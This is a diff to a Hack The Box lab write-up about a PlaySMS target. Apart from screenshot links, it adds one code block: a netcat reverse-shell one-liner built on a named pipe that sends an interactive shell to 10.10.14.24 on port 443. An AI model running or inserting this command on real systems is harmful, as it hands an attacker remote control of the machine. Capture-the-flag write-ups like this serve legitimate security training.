@@ -144,6 +144,11 @@ PlaySMS
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/be43de70-9326-471d-ace4-c6730b15f331)
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/cef3e540-3663-4b09-bca6-3d7c4d1df311)
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/2a4267c2-c02e-4040-9def-c313c6dd0781)
-
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/fd6a5f06-6ac8-40c5-9ba4-2cfaaa26134c)
+
+```CSS
+ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 443 >/tmp/f
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/b756190e-316c-4b47-8573-5f0aee4b544e)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5c0cf823-e7fe-4cc3-94f5-11f4862fcf2c)
 
